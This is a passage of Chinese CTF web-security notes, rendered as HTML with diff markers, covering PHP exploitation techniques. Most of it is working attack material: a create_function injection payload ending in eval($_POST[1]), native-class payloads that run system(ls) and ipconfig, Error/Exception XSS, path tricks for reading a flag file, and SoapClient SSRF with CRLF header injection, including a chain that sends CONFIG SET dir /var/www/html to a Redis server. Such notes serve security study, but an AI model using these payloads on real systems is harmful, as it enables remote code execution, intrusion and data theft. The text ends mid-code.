class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">proc</span><span class="o">/</span><span class="bp">self</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span><span class="o">/</span><span class="n">flag</span><span class="o">.</span><span class="n">php</span>
+</span></span></code></pre></div><h4 id="is_numeric">
+<a class="header-anchor" href="#is_numeric"></a>
+is_numeric()
+</h4><p>数字前加空格返回true，后加空格为false 8.0+修复</p>
+<h4 id="trim">
+<a class="header-anchor" href="#trim"></a>
+trim()
+</h4><p>trim()函数会去掉num里的%0a %0b %0d %20 %09 不会去掉%0c</p>
+<h4 id="readfile">
+<a class="header-anchor" href="#readfile"></a>
+readfile()
+</h4><p>1、支持伪协议</p>
+<p>2、绝对路径时可加入特定字符</p>
+<p>1、支持绝对路径</p>
+<h4 id="call_user_func">
+<a class="header-anchor" href="#call_user_func"></a>
+call_user_func()
+</h4><p>第一个参数 callback 是被调用的回调函数，其余参数是回调函数的参数。</p>
+<p>调用类中的方法</p>
+<p>1、静态调用</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">myclass</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">static</span> <span class="k">function</span> <span class="nf">say_hello</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Hello!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$classname</span> <span class="o">=</span> <span class="s2">&#34;myclass&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">call_user_func</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$classname</span><span class="p">,</span> <span class="s1">&#39;say_hello&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nx">call_user_func</span><span class="p">(</span><span class="nv">$classname</span> <span class="o">.</span><span class="s1">&#39;::say_hello&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$myobject</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">myclass</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">call_user_func</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="nv">$myobject</span><span class="p">,</span> <span class="s1">&#39;say_hello&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>2、数组调用</p>
+<h4 id="creat_function">
+<a class="header-anchor" href="#creat_function"></a>
+creat_function()
+</h4><p><code>create_funcation('$a,$b',$code)</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250523175457667.png" alt="image-20250523175457589"></p>
+<p>payload</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$code</span><span class="o">=</span><span class="s2">&#34;return(</span><span class="si">$a</span><span class="s2">+</span><span class="si">$b</span><span class="s2">);}eval(</span><span class="si">$_POST[1]</span><span class="s2">);//&#34;</span>
+</span></span></code></pre></div><h4 id="__autoload-和-class_exists">
+<a class="header-anchor" href="#__autoload-%e5%92%8c-class_exists"></a>
+__autoload 和 class_exists()
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">class_exists</span><span class="p">(</span><span class="nx">string</span> <span class="nv">$class</span><span class="p">,</span> <span class="nx">bool</span> <span class="nv">$autoload</span> <span class="o">=</span> <span class="k">true</span><span class="p">)</span><span class="o">:</span> <span class="nx">bool</span>
+</span></span></code></pre></div><p><code>__autoload</code> 是为了定义 PHP 加载未知类的时候进行的操作, 之前强网杯也出过 <code>spl_autoload </code>相关的题 (<code>spl_autoload</code> 是 <code>__autoload</code> 的默认实现)</p>
+<p>这里需要注意的是用 <code>class_exist</code> 检查一个类是否存在的时候, 默认会自动调用<code> __autoload</code> 方法</p>
+<h3 id="php原生类">
+<a class="header-anchor" href="#php%e5%8e%9f%e7%94%9f%e7%b1%bb"></a>
+php原生类
+</h3><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$v1</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v1&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$v2</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;v2&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]+/&#39;</span><span class="p">,</span> <span class="nv">$v1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/[a-zA-Z]+/&#39;</span><span class="p">,</span> <span class="nv">$v2</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo new </span><span class="si">$v1</span><span class="s2">(</span><span class="si">$v2</span><span class="s2">());&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>在php官方文档找到带有::__toString的后缀</p>
+<p>payload</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">CachingIterator</span><span class="p">::</span><span class="n">__toString</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">DirectoryIterator</span><span class="p">::</span><span class="n">__toString</span>
+</span></span><span class="line"><span class="cl"><span class="n">Error</span><span class="p">::</span><span class="n">__toString</span>
+</span></span><span class="line"><span class="cl"><span class="n">Exception</span><span class="p">::</span><span class="n">__toString</span>
+</span></span><span class="line"><span class="cl"><span class="n">pyload</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="n">v1</span><span class="o">=</span> <span class="n">CachingIterator</span><span class="o">&amp;</span><span class="n">v2</span><span class="o">=</span><span class="n">system</span><span class="p">(</span><span class="n">ls</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="n">v1</span><span class="o">=</span> <span class="n">DirectoryIterator</span><span class="o">&amp;</span><span class="n">v2</span><span class="o">=</span><span class="n">system</span><span class="p">(</span><span class="n">ls</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="n">v1</span><span class="o">=</span> <span class="n">Error</span><span class="o">&amp;</span><span class="n">v2</span><span class="o">=</span><span class="n">system</span><span class="p">(</span><span class="n">ls</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="n">v1</span><span class="o">=</span> <span class="n">Exception</span><span class="o">&amp;</span><span class="n">v2</span><span class="o">=</span><span class="n">system</span><span class="p">(</span><span class="n">ls</span><span class="p">)</span>
+</span></span></code></pre></div><h4 id="寻找原生类">
+<a class="header-anchor" href="#%e5%af%bb%e6%89%be%e5%8e%9f%e7%94%9f%e7%b1%bb"></a>
+寻找原生类
+</h4><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$classes</span> <span class="o">=</span> <span class="nx">get_declared_classes</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$classes</span> <span class="k">as</span> <span class="nv">$class</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$methods</span> <span class="o">=</span> <span class="nx">get_class_methods</span><span class="p">(</span><span class="nv">$class</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$methods</span> <span class="k">as</span> <span class="nv">$method</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$method</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__destruct&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__toString&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__wakeup&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__call&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__callStatic&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__get&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__set&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__isset&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__unset&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__invoke&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s1">&#39;__set_state&#39;</span>    
+</span></span><span class="line"><span class="cl">            <span class="c1">// 可以根据题目环境将指定的方法添加进来, 来遍历存在指定方法的原生类
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">print</span> <span class="nv">$class</span> <span class="o">.</span> <span class="s1">&#39;::&#39;</span> <span class="o">.</span> <span class="nv">$method</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h5 id="reflectionclass">
+<a class="header-anchor" href="#reflectionclass"></a>
+ReflectionClass
+</h5><p>1、实体化参数为其他类名的字符串形式，可读取该类的信息</p>
+<h4 id="errorexception">
+<a class="header-anchor" href="#errorexception"></a>
+Error/Exception
+</h4><h5 id="error-xss">
+<a class="header-anchor" href="#error-xss"></a>
+Error XSS
+</h5><p><code>__tostring()</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">适用于php7
+</span></span><span class="line"><span class="cl">开启报错的情况下
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Error</span><span class="p">(</span><span class="s2">&#34;&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</span></span></code></pre></div><h5 id="excepthin-xss">
+<a class="header-anchor" href="#excepthin-xss"></a>
+Excepthin XSS
+</h5><p><code>__tostring()</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">适用于php5、7版本
+</span></span><span class="line"><span class="cl">开启报错的情况下
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;&lt;script&gt;alert(&#39;1&#39;)&lt;/script&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
+</span></span></code></pre></div><h5 id="error-命令执行">
+<a class="header-anchor" href="#error-%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c"></a>
+Error 命令执行
+</h5><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;b&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">eval</span><span class="p">(</span><span class="s2">&#34;echo new </span><span class="si">$a</span><span class="s2">(</span><span class="si">$b</span><span class="s2">());&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><blockquote>
+<p>?a=Error&amp;b=phpinfo
+?a=Error&amp;b=system(‘ipconfig’)</p></blockquote>
+<h5 id="绕过哈希比较">
+<a class="header-anchor" href="#%e7%bb%95%e8%bf%87%e5%93%88%e5%b8%8c%e6%af%94%e8%be%83"></a>
+绕过哈希比较
+</h5><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Error</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span><span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Error</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\r\n\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250719221251263.png" alt="image-20250719221251172"></p>
+<p>[2020 极客大挑战]Greatphp</p>
+<h4 id="soapclient类">
+<a class="header-anchor" href="#soapclient%e7%b1%bb"></a>
+SoapClient类
+</h4><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端。</p>
+<h5 id="ssrf">
+<a class="header-anchor" href="#ssrf"></a>
+SSRF
+</h5><p><code>__call</code>方法
+当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。而__call触发很简单，就是当对象访问不存在的方法的时候就会触发。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//uri+cc=SOAPAction
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;location&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;http://ip:6666/coleak&#39;</span><span class="p">,</span> <span class="s1">&#39;uri&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;http://ip:6666&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">-&gt;</span><span class="na">cc</span><span class="p">();</span>    <span class="c1">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>但是，由于它仅限于HTTP/HTTPS协议，所以用处不是很大。而如果这里HTTP头部还存在CRLF漏洞的话，但我们则可以通过SSRF+CRLF，插入任意的HTTP头。
+如下测试代码，我们在HTTP头中插入一个cookie：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$target</span> <span class="o">=</span> <span class="s1">&#39;http://47.xxx.xxx.72:2333/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;location&#39;</span> <span class="o">=&gt;</span> <span class="nv">$target</span><span class="p">,</span> <span class="s1">&#39;user_agent&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;WHOAMI</span><span class="se">\r\n</span><span class="s2">Cookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4&#34;</span><span class="p">,</span> <span class="s1">&#39;uri&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;test&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">();</span>    <span class="c1">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250719222155001.png" alt="图片预览">
+通过一下代码打redis</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$target</span> <span class="o">=</span> <span class="s1">&#39;http://47.xxx.xxx.72:6379/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$poc</span> <span class="o">=</span> <span class="s2">&#34;CONFIG SET dir /var/www/html&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;location&#39;</span> <span class="o">=&gt;</span> <span class="nv">$target</span><span class="p">,</span> <span class="s1">&#39;uri&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;hello^^&#39;</span><span class="o">.</span><span class="nv">$poc</span><span class="o">.</span><span class="s1">&#39;^^hello&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;^^&#39;</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\n\r</span><span class="s2">&#34;</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">();</span>    <span class="c1">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250719222314686.png" alt="图片预览"></p>
+<p>这样我们就可以利用HTTP协议去攻击Redis了。</p>
+<p>对于如何发送POST的数据包，这里面还有一个坑，就是 <code>Content-Type</code> 的设置，因为我们要提交的是POST数据 <code>Content-Type</code> 的值我们要设置为 <code>application/x-www-form-urlencoded</code>，这里如何修改 <code>Content-Type</code> 的值呢？由于 <code>Content-Type</code> 在 <code>User-Agent</code> 的下面，所以我们可以通过 <code>SoapClient</code> 来设置 <code>User-Agent</code> ，将原来的 <code>Content-Type</code> 挤下去，从而再插入一个新的 <code>Content-Type</code> 。</p>
+<p>测试代码如下：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$target</span> <span class="o">=</span> <span class="s1">&#39;http://47.xxx.xxx.72:2333/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$post_data</span> <span class="o">=</span> <span class="s1">&#39;data=whoami&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$headers</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;X-Forwarded-For: 127.0.0.1&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Cookie: PHPSESSID=3stu05dr969ogmprk28drnju93&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;location&#39;</span> <span class="o">=&gt;</span> <span class="nv">$target</span><span class="p">,</span><span class="s1">&#39;user_agent&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;wupco^^Content-Type: application/x-www-form-urlencoded^^&#39;</span><span class="o">.</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39;^^&#39;</span><span class="p">,</span><span class="nv">$headers</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;^^Content-Length: &#39;</span><span class="o">.</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$post_data</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;^^^^&#39;</span><span class="o">.</span><span class="nv">$post_data</span><span class="p">,</span><span class="s1">&#39;uri&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;test&#39;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nx">str_replace</span><span class="p">(</span><span class="s1">&#39;^^&#39;</span><span class="p">,</span><span class="s2">&#34;</span><span class="se">\n\r</span><span class="s2">&#34;</span><span class="p">,</span><span class="nv">$b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">a</span><span class="p">();</span>    <span class="c1">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div><p>执行代码后，如下图所示，成功发送POST数据：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/lierbushiwo/image/20250719222345779.png" alt="图片预览"></p>
+<h4 id="文件操作类">
+<a class="header-anchor" href="#%e6%96%87%e4%bb%b6%e6%93%8d%e4%bd%9c%e7%b1%bb"></a>
+文件操作类
+</h4><h5 id="遍历文件目录类">
+<a class="header-anchor" href="#%e9%81%8d%e5%8e%86%e6%96%87%e4%bb%b6%e7%9b%ae%e5%bd%95%e7%b1%bb"></a>
+遍历文件目录类
+</h5><h6 id="directoryiterator类">
+<a class="header-anchor" href="#directoryiterator%e7%b1%bb"></a>
+DirectoryIterator类
+</h6><p><code>__toString()</code> 方法</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$dir</span><span class="o">=</span><span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$dir</span> <span class="k">as</span> <span class="nv">$f</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span><span class="p">(</span><span class="nv">$f</span><span class="o">.</span><span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>搭配glob协议</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$dir</span><span class="o">=</span><span class="k">new</span> <span class="nx">DirectoryIterator</span><span class="p">(</span><span class="s2">&#34;glob:///*fl*&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$dir</span><span class="p">;</span>
+</span></span></code></pre></div><h6 id="filesystemiterator类">
+<a class="header-anchor" href="#filesystemiterator%e7%b1%bb"></a>
+FilesystemIterator类
+</h6><p>等效于<code>DireatoryIterator</code>类</p>
+<h6 id="globiterator类">
+<a class="header-anchor" href="#globiterator%e7%b1%bb"></a>
+GlobIterator类
+</h6><p>相当于<code>DireatoryIterator</code>类自配<code>glob://</code>协议</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$dir</span> <span class="o">=</span> <span class="s1">&#39;/fl*&#39;</span><span class="p">;</span>
